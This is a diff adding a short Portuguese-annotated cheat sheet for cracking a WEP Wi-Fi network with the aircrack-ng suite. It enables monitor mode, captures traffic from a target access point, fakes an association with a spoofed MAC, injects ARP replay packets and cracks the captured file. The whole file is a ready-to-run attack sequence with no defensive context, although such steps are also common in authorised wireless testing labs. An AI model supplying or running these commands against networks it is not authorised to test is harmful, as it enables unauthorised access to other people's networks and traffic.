@@ -1,0 +1,18 @@
+airmon-ng check kill
+airmon-ng start wlan0
+
+airodump-ng mon0 (copiar os detalhes do alvo)
+
+airodump-ng -c <ch> -w nomedoarquivo --bssid <mac> mon0
+
+ctrl+shift+n
+
+aireplay-ng -1 0 -a <macAP> -e <NomedaRede> mon0 (-h mac falso)
+esperar a mensagem "Association successful"
+
+aireplay-ng -3 -b <macAP> mon0 pode usar -h opcional
+READ
+
+ctrl+shift+n
+
+aircrack-ng -b <mac> nomedoarquivo-01.cap
